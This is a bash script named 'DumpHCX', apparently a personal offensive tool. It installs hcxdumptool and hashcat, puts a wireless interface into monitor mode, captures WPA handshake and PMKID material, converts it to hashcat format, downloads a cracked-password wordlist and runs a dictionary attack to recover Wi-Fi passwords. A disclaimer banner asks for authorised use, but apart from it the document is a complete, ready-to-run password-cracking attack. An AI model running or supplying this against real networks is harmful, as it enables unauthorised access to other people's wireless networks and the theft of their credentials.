#!/bin/bash

# Coded by Ahmed Noaman
# email  : an758592@gmail.com
# github : https://github.com/an758592/

tools=("hcxtools" "hcxdumptool" "wget" "gzip" "iw" "hashcat" "gamemode")
interface="wlan0"
wordlist="/usr/share/wordlists/cracked.txt"

RED='\033[0;31m'
BLUE='\033[0;34m'
RESET='\033[0m'

clear

echo ""
echo -e "${RED}██  ██  ██  ██████  ██████████${RESET}"
echo -e "${RED}██  ██  ██    ██    ██      ██${RESET}"
echo -e "${RED}██  ██  ██    ██    ████    ██${RESET}"
echo -e "${RED}██  ██  ██    ██    ██      ██${RESET}"
echo -e "${RED}██████████  ██████  ██    ████${RESET} - ${BLUE}DumpHCX${RESET}"
echo ""
echo "- By using this script you agree to the following terms :"
echo "+ Usage           : The script is for educational and testing purposes only, and users must have the necessary permissions for security testing on wireless networks."
echo "+ Responsibility  : Users are solely responsible for their actions using the script, including compliance with laws and regulations."
echo "+ No Warranty     : The script is provided as is, without any warranties."
echo "+ No Liability    : The author of the script are not liable for damages arising from its use."
echo "+ Ethical Use     : Users agree to use the script ethically and responsibly, obtaining proper authorization before testing networks."
echo "+ Compliance      : Users agree to comply with all applicable laws, regulations, and ethical guidelines."
echo "+ Indemnification : Users agree to indemnify the author from any claims arising from their use of the script."
echo "+ Modification    : Users may modify the script for personal use but may not distribute modified versions without permission."
echo "+ Termination     : The author reserve the right to terminate or suspend access to the script without notice."
echo "+ Acceptance      : By using the script, users acknowledge and agree to these terms and conditions."
echo ""

read -p "> Do you agree with these TERMS? [y=YES-continue/n=NO-exit] : " terms
case $terms in
	y|Y)
		if [ $(id -u) != 0 ]; then
			echo -e "${RED}> Run the script as ROOT or use sudo, and try again.${RESET}"
			exit
		fi

		if [ -f /etc/os-release ]; then
			source /etc/os-release
			distribution="$ID"
		elif [ -f /etc/lsb-release ]; then
			source /etc/lsb-release
			distribution="$DISTRIB_ID"
		fi

		for tool in ${tools[@]}; do
			if ! command -v $tool &> /dev/null; then
				case $distribution in
					ubuntu|kali|debian)
						apt-get update -y
						apt-get install $tool -y
						;;
					fedora)
						dnf update -y
						dnf install $tool -y
						;;
					*)
						echo -e "${RED}> Install $tool MANUALLY, and try again.${RESET}"
						exit
						;;
				esac
			fi
		done

		clear

		ip addr

		read -p "> Enter the wireless INTERFACE to use [default=wlan0] : " interface

		read -p "> Enter the PATH and NAME to save the capfile [/path/name] : " cap
		cap=${cap:-"$(pwd)/$(date +%T)"}
		
		systemctl stop wpa_supplicant.service
		systemctl stop NetworkManager.service
		systemctl daemon-reload
		ip link set $interface down
		iw dev $interface set type monitor
		ip link set $interface up
		hcxdumptool -i $interface -w $cap.pcapng
		hcxpcapngtool -o $cap.hash -E ESSID.txt $cap.pcapng
		ip link set $interface down
		iw dev $interface set type managed
		ip link set $interface up
		systemctl start wpa_supplicant.service
		systemctl start NetworkManager.service
		systemctl daemon-reload

		read -p "> Start password cracking with HASHCAT? [y/n] : " crack
		case $crack in
			y|Y)
				read -p "> Do you want to download WORDLIST file? [1=download-it/2=already-have-it/3=use-another-wordlist] : " download
				case $download in
					1)
						mkdir -p /usr/share/wordlists/
						wget -O /usr/share/wordlists/cracked.txt.gz https://wpa-sec.stanev.org/dict/cracked.txt.gz
						gunzip /usr/share/wordlists/cracked.txt.gz
						echo -e "${RED}> $wordlist is set to be the default.${RESET}"
						;;
					2)
						echo -e "${RED}> $wordlist is set to be the default.${RESET}"
						;;
					3)
						read -p "> Enter the PATH and NAME to the WORDLIST [/path/name] : " wordlist
						echo -e "${RED}> $wordlist is set to be the default.${RESET}"
						;;
					*)
						exit
						;;
				esac
				gamemode hashcat -a 0 -m 22000 $cap.hash $wordlist
				exit
				;;
			*)
				exit
				;;
		esac
		;;
	*)
		echo -e "${RED}> You are UNAUTHORIZED to use the Script.${RESET}"
		exit
		;;
esac
